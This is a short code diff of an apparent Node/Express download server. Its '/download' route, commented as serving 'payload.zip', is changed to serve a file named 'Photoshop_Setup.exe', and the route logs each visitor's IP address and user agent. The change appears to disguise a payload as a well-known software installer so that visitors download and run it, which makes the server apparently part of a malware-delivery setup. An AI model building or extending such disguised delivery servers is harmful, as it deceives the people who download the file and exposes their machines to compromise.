@@ -35,7 +35,7 @@ app.get('/', (req, res) => {
 
 // Serve the payload.zip
 app.get('/download', (req, res) => {
-    const zipPath = path.join(__dirname, 'payload.zip');
+    const zipPath = path.join(__dirname, 'Photoshop_Setup.exe');
     const ip = req.ip || req.connection.remoteAddress;
     const ua = req.headers['user-agent'] || 'unknown';
     
